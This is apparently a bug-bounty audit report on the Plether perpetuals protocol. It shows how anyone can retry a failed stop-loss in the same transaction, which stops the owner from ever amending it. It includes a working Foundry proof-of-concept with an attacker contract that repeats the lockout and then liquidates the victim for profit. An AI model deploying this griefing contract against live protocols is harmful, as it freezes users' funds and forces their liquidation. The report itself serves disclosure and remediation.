# \#98012 [SC-High] Permissionless retry of a failed stop-loss blocks the owner from amending, locking the position

**Submitted on Nov 4th 2026 at 11:33:21 UTC by @xKeywordx for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98012
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)
  - Temporary freezing of funds for at least 1 hour

## Description

## Description

A malicious user can stop the owner of a position from fixing a stop-loss that failed. The owner may change the stop-loss limits only during a pause after a failed close attempt. Anyone can end that pause in the same transaction that starts it, by queuing the close again. The owner never gets a turn. They also cannot cancel the stop-loss or close the position themselves, so they stay stuck until the price comes back or they are liquidated. 

When a stop-loss (`PositionProtection`) triggers, the Router queues a close "attempt" capped by the owner's close ceilings. If the attempt fails or expires, the protection becomes `Latched`. Two calls are then possible:
- **Only while `Latched` and only the owner** can raise the ceilings through the `amendLatchedPositionProtectionCloseLimits` function.
- **Anyone** can call `retryPositionProtectionClose`. This queues a new attempt with the stored ceilings, and the protection goes back to `Triggered`.

If an attacker ends the attempt and retries in **one transaction**:

1. The attempt fails or expires, so the protection is `Latched`, but only inside the attacker's transaction.
2. In the same transaction, `retryPositionProtectionClose` sets it back to `Triggered`.
3. In the owner's next transaction, `amend` reverts with `OrderRouter__ProtectionNotLatched`. Cancel and close revert too.

The attacker can repeat this every 60s (the default execution window). The stop-loss keeps failing until the price comes back or the owner is liquidated.

## Root cause

Amend and retry both require `Latched`, but only amend is owner-only, and nothing stops a retry in the same transaction as the relatch. Looking at the `PositionProtectionBook.sol` contract, the `amendLatchedPositionProtectionCloseLimits` function requires the status to be `Latched` and the `owner` to be the caller, while `retryPositionProtectionClose` requires `Latched` and is permissionless:

```solidity
function amendLatchedPositionProtectionCloseLimits(...) external {
    protection = _ownedActiveProtection(protectionId, msg.sender);
    if (protection.status != Latched) revert OrderRouter__ProtectionNotLatched();
    ...
}

function retryPositionProtectionClose(uint64 protectionId) external {
    protection = _activeProtection(protectionId);
    if (protection.status != Latched) revert OrderRouter__ProtectionNotLatched();
    ... commitProtectionCloseAttempt(...);
}
```

`expireOrder` and `executeOrder` relatch the protection inside the same call and the retry has no delay. Nothing separates the relatch from the retry.

The owner has no other way out:
- `cancelPositionProtection` accepts only `PendingOpen` / `Armed`, so it reverts `ProtectionNotArmed`.
- `cancelPositionProtectionAndCommitClose` accepts only `Armed`, so it reverts `ProtectionNotArmed`.
- An ordinary close reverts `ProtectionActive`.

## Impact

**Medium: Temporary freezing of funds for at least 1 hour.**
- **Frozen:** the owner cannot amend, cancel or close their position. Their margin stays locked for as long as the attacker loops; the PoC below shows more than 1 hour.
- **Potential for funds loss:** the stop-loss never executes. If the price keeps moving in the unfavorable direction, the owner can be liquidated (unless they add more margin), and the attacker takes the keeper share. The idea is to "stall" and keep the owner's position locked for enough time until it becomes liquidatable.
- **Limitation**: an owner who can batch calls (smart account / EIP-7702) can end the attempt and amend in one transaction. A plain EOA owner needs two separate transactions, and the attacker's bot retries in between.

## Additional context about why this is a new issue and not a duplicate based on previous reports and this Audit Comp rules

**Broken promises and assumptions:**
- `IPositionProtectionActions.sol`, the natspec above the `amendLatchedPositionProtectionCloseLimits` function says: *"Lets the owner change close limits after a failed attempt relatches, before a fresh retry."* An attacker can make this unreachable.
- `CANONICAL_ENTRYPOINTS.md` file says: *The owner may amend the close ceilings of a `Latched` protection with `PositionProtectionBook.amendLatchedPositionProtectionCloseLimits(uint64,CloseFinancialLimits)`*.
- Cecuro MED-9 Comment says: *"Only the owner may amend the retained ceilings while protection is Latched … Tight limits may prevent execution until conditions improve or the owner amends them."* An attacker can block the "owner amends" step.
- `SECURITY.md`file: *"Triggering is irreversible."* That leaves amending as the only recovery.
- **The design assumes a gap between relatch and retry, but nothing enforces it.**
  - `CANONICAL_ENTRYPOINTS.md` instructs keepers to *"submit the separate retry transaction"*.
  - The protocol's own test `test_ProtectionCloseLimits_OnlyOwnerCanAmendLatchedLimitsForNextRetry` puts the owner's amend transaction before the retry.
- **Monitoring misses it.** `SECURITY.md` alerts on *"prolonged `Latched` state without a live child"*. Under attack the protection is always `Triggered` with a live child.

**Why this differs from previous audits:**
- **Cecuro MED-9** added the owner-only amend. This report shows that recovery path can be blocked, which based on this Audit Comp rules falls under the `Known Issues and Previous Audits -> Known Issues -> "For findings marked as fixed or Acknowledged ... is incomplete or introduces a new bug"`. The fix introduces this new bug.
- **Different root causes than:** Cecuro MED-15 and Cecuro LOW-73.
- **The documented limitation covers the opposite case.** Based on `SECURITY.md` "Router and keeper limitations" is about keepers that *fail* to retry (liveness), not callers who retry immediately.
- **In scope:** The rules treat keepers as untrusted, so harm from any caller acting as a keeper counts.

## Recommended mitigation

Let the owner amend while `Triggered`. The live attempt keeps its pinned bounds, and the next retry copies the new ceilings:

```diff
-    if (protection.status != Latched) revert OrderRouter__ProtectionNotLatched();
-    if (ROUTER.pendingOrderCounts(msg.sender) != 0) revert OrderRouter__PendingOrdersExist();
+    if (protection.status == Latched) {
+        if (ROUTER.pendingOrderCounts(msg.sender) != 0) revert OrderRouter__PendingOrdersExist();
+    } else if (protection.status != Triggered) {
+        revert OrderRouter__ProtectionNotLatched();
+    }
```

Alternatively, you can consider giving the owner an exclusive retry window after each relatch. The protocol can create a new variable and store a "latchedAt" timestamp in it and add a grace period for the owner and let non-owners retry only after `latchedAt + grace period`.

## Proof of Concept

## Proof of Concept

Put the following POC in the existing `packages/perps/test/perps/spec/trader/PositionProtection.t.sol` file and run it. The test must be pasted inside the `PositionProtectionTest` contract code block and the helpers (`IF02KeeperSurface && F02ProtectionRetryGriefer`) outside, but in the same file.

```solidity
    function test_PoC_F02_SameTxRetryLocksOwnerOutOfAmend() public {
        _startRecordingLogs();
        address mallory = address(0xBAD0);

        // Alice: 10,000 USDG LONG with 2,000 USDG margin. LONG is long the dollar; it profits when the basket mark falls.
        // A LONG loses when the mark rises, so her stop-loss is 1.10.     
        // She caps the stop-loss close at 10,500 USDG of execution notional. At 1.10 the close is 11,000 USDG.
        _open(ALICE, CfdTypes.Side.LONG, POSITION_SIZE, POSITION_MARGIN_ASSETS, MARK_PRICE);
        PositionProtectionTypes.PositionProtectionParams memory params = _params(0, LONG_STOP_LOSS);
        params.closeLimits.maxExecutionNotionalAssets = 10_500e6;
        vm.prank(ALICE);
        uint64 protectionId = protectionActions.createPositionProtection(params);
        // Only the position margin backs the account (same fixture as the latched-liquidation test above).
        _withdrawAllFreeSettlement(ALICE);

        // The ceiling Alice wants to switch to once she sees the stop-loss fail.
        PositionProtectionTypes.CloseFinancialLimits memory relaxed = PositionProtectionTypes.CloseFinancialLimits({
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max
        });

        // The price reaches the stop-loss and a keeper triggers the protection.
        uint64 attemptId = _triggerAt(protectionId, LONG_STOP_LOSS);

        // ---------------------------------------------------------------------------------------------------------
        // Expected flow: with one transaction between the relatch and the retry, the documented recovery works.
        // ---------------------------------------------------------------------------------------------------------
        uint256 branch = vm.snapshotState();
        {
            bytes[] memory controlData = _mockPythUpdateData(LONG_STOP_LOSS);
            vm.prank(EXECUTION_KEEPER);
            OrderV3Types.ExecutionResult memory honest = router.executeOrder(attemptId, controlData);
            assertEq(
                uint8(honest.terminalReason),
                uint8(OrderV3Types.TerminalReason.ConstraintViolation),
                "control: the close breaks Alice's own notional ceiling"
            );
            assertEq(
                uint8(protectionViews.getPositionProtection(protectionId).status),
                uint8(PositionProtectionTypes.PositionProtectionStatus.Latched),
                "control: the failed attempt relatches"
            );

            vm.prank(ALICE);
            protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, relaxed);
            vm.prank(CAROL);
            uint64 controlRetryId = protectionActions.retryPositionProtectionClose(protectionId);
            controlData = _mockPythUpdateData(LONG_STOP_LOSS);
            vm.prank(EXECUTION_KEEPER);
            assertEq(
                uint8(router.executeOrder(controlRetryId, controlData).status),
                uint8(OrderV3Types.LifecycleStatus.Executed),
                "control: the amended retry executes"
            );
            (uint256 controlSize,,,,,,) = engine.positions(ALICE);
            assertEq(controlSize, 0, "control: Alice exits at the stop-loss");
        }
        vm.revertToState(branch);

        // ---------------------------------------------------------------------------------------------------------
        // Attacker flow: Mallory's contract ends each attempt and queues a retry in the same transaction.
        // ---------------------------------------------------------------------------------------------------------
        F02ProtectionRetryGriefer griefer =
            new F02ProtectionRetryGriefer(IF02KeeperSurface(address(router)), protectionActions);
        // vm.getBlockTimestamp(), not block.timestamp: via-IR can cache block fields within one test (BasePerpTest).
        uint256 attackStart = vm.getBlockTimestamp();

        // Cycle 1: execute the failing attempt and retry in one call. The attempt still fails on Alice's ceiling,
        // but the retry lands before the transaction ends, so Alice never sees `Latched`.
        bytes[] memory updateData = _mockPythUpdateData(LONG_STOP_LOSS);
        vm.prank(mallory);
        (OrderV3Types.ExecutionResult memory result, uint64 nextAttemptId) =
            griefer.executeAndRetry(attemptId, protectionId, updateData);
        assertEq(
            uint8(result.terminalReason),
            uint8(OrderV3Types.TerminalReason.ConstraintViolation),
            "attempt failed on Alice's own ceiling"
        );
        assertGt(nextAttemptId, attemptId, "a fresh retry was queued in the same call");
        attemptId = nextAttemptId;
        _assertF02OwnerLockedOut(protectionId, attemptId, params.closeLimits, relaxed);

        // Cycles 2-61: when each attempt's 60s window ends, Mallory expires it and retries.
        // Each cycle advances at least 61s, so the 60 cycles keep Alice locked out for over an hour.
        for (uint256 i; i < 60; ++i) {
            vm.warp(uint256(router.lifecycleBook().orderTiming(attemptId).executionDeadline) + 1);
            vm.prank(mallory);
            (result, nextAttemptId) = griefer.expireAndRetry(attemptId, protectionId);
            assertEq(uint8(result.terminalReason), uint8(OrderV3Types.TerminalReason.Expired), "attempt expired");
            attemptId = nextAttemptId;
            _assertF02OwnerLockedOut(protectionId, attemptId, params.closeLimits, relaxed);
        }
        assertGe(vm.getBlockTimestamp(), attackStart + 1 hours, "Alice has been locked out for at least one hour");
        assertEq(clearinghouse.balanceAssets(address(griefer)), 0, "the loop needs no deposit and earns no bounty");

        // The price keeps rising. Mallory expires the last attempt and liquidates Alice in the same call.
        vm.warp(uint256(router.lifecycleBook().orderTiming(attemptId).executionDeadline) + 1);
        _mockPythUpdateData(150_000_000);
        bytes[] memory liquidationData = _livePriceData(150_000_000);
        uint256 expectedReserve = ((POSITION_SIZE * MARK_PRICE) / 1e20) * 10 / 10_000;
        vm.prank(mallory);
        griefer.expireAndLiquidate(attemptId, ALICE, liquidationData);

        (uint256 sizeAfter,,,,,,) = engine.positions(ALICE);
        assertEq(sizeAfter, 0, "Alice was liquidated instead of exiting at her stop-loss");
        assertEq(
            uint8(protectionViews.getPositionProtection(protectionId).status),
            uint8(PositionProtectionTypes.PositionProtectionStatus.Liquidated),
            "the protection ends as Liquidated"
        );
        assertEq(
            clearinghouse.balanceAssets(address(griefer)),
            expectedReserve / 2,
            "Mallory's contract collects the liquidation keeper share"
        );
    }

    /// @dev At every transaction boundary during the attack, each owner exit reverts.
    function _assertF02OwnerLockedOut(
        uint64 protectionId,
        uint64 attemptId,
        PositionProtectionTypes.CloseFinancialLimits memory originalLimits,
        PositionProtectionTypes.CloseFinancialLimits memory relaxedLimits
    ) internal {
        assertEq(
            uint8(protectionViews.getPositionProtection(protectionId).status),
            uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered),
            "a live retry exists at every transaction boundary"
        );
        assertEq(router.pendingOrderCounts(ALICE), 1, "exactly one live attempt");
        _assertPendingCloseLimits(attemptId, originalLimits);

        // 1. The documented recovery: amend the ceiling. Allowed only while `Latched`.
        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, relaxedLimits);
        _assertStoredCloseLimits(protectionId, originalLimits);

        // 2. Cancel the protection. Allowed only while `PendingOpen` or `Armed`.
        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
        protectionActions.cancelPositionProtection(protectionId);

        // 3. Cancel the protection and commit a close in one call. Allowed only while `Armed`.
        _expectCancelAndCommitCloseRevert(
            protectionId,
            _manualCloseRequest(CfdTypes.Side.LONG),
            abi.encodeWithSelector(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector)
        );

        // 4. An ordinary close. Blocked by the active protection lock.
        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionActive.selector);
        router.commitOrder(CfdTypes.Side.LONG, POSITION_SIZE, 0, 0, true);
    }

}

/// @notice The keeper entrypoints the attacker uses. Same selectors as `IPerpsKeeper`.
interface IF02KeeperSurface {

    function executeOrder(
        uint64 orderId,
        bytes[] calldata pythUpdateData
    ) external payable returns (OrderV3Types.ExecutionResult memory result);

    function expireOrder(
        uint64 orderId
    ) external returns (OrderV3Types.ExecutionResult memory result);

    function executeLiquidation(
        address account,
        bytes[] calldata pythUpdateData
    ) external payable;

}

/// @notice The attacker. Each call ends the live protection attempt and queues a fresh retry in the same
///         transaction, so the protection is never `Latched` when the owner's own transaction runs.
contract F02ProtectionRetryGriefer {

    IF02KeeperSurface internal immutable ROUTER;
    IPositionProtectionActions internal immutable PROTECTIONS;

    constructor(
        IF02KeeperSurface router_,
        IPositionProtectionActions protections_
    ) {
        ROUTER = router_;
        PROTECTIONS = protections_;
    }

    /// @notice Executes the live attempt (it fails on the owner's ceiling) and retries in the same call.
    function executeAndRetry(
        uint64 attemptId,
        uint64 protectionId,
        bytes[] calldata pythUpdateData
    ) external returns (OrderV3Types.ExecutionResult memory result, uint64 nextAttemptId) {
        result = ROUTER.executeOrder(attemptId, pythUpdateData);
        nextAttemptId = PROTECTIONS.retryPositionProtectionClose(protectionId);
    }

    /// @notice Expires the live attempt after its deadline (oracle-free, unpaid) and retries in the same call.
    function expireAndRetry(
        uint64 attemptId,
        uint64 protectionId
    ) external returns (OrderV3Types.ExecutionResult memory result, uint64 nextAttemptId) {
        result = ROUTER.expireOrder(attemptId);
        nextAttemptId = PROTECTIONS.retryPositionProtectionClose(protectionId);
    }

    /// @notice Expires the live attempt and liquidates the owner in the same call.
    function expireAndLiquidate(
        uint64 attemptId,
        address account,
        bytes[] calldata pythUpdateData
    ) external {
        ROUTER.expireOrder(attemptId);
        ROUTER.executeLiquidation(account, pythUpdateData);
    }

}
```

Test output
```javascript
Ran 1 test for test/perps/spec/trader/PositionProtection.t.sol:PositionProtectionTest
[PASS] test_PoC_F02_SameTxRetryLocksOwnerOutOfAmend() (gas: 62115674)
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 99.94ms (89.45ms CPU time)

Ran 1 test suite in 101.17ms (99.94ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```
